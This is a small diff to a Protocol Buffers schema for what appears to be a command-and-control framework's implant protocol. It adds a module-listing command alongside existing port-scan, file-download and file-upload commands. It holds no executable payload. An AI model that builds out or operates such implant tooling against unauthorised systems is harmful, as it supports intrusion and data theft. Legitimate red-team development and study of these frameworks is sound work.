@@ -36,7 +36,7 @@ message PortScan {
     bool cancel = 4; // True if should cancel current running scan
 }
 
-
+message ListModules {}
 
 message GetFile {
     string filename = 1;
@@ -55,6 +55,7 @@ message CheckCmdRequest {
     }
 }
 
+
 // C2 -> Implant
 message CheckCmdReply {
     oneof message {
@@ -63,5 +64,6 @@ message CheckCmdReply {
         GetFile getfile = 3;
         UploadFile uploadfile = 4; 
         PortScan portscan = 5;
+        ListModules listmodules = 6;        
     }
 }
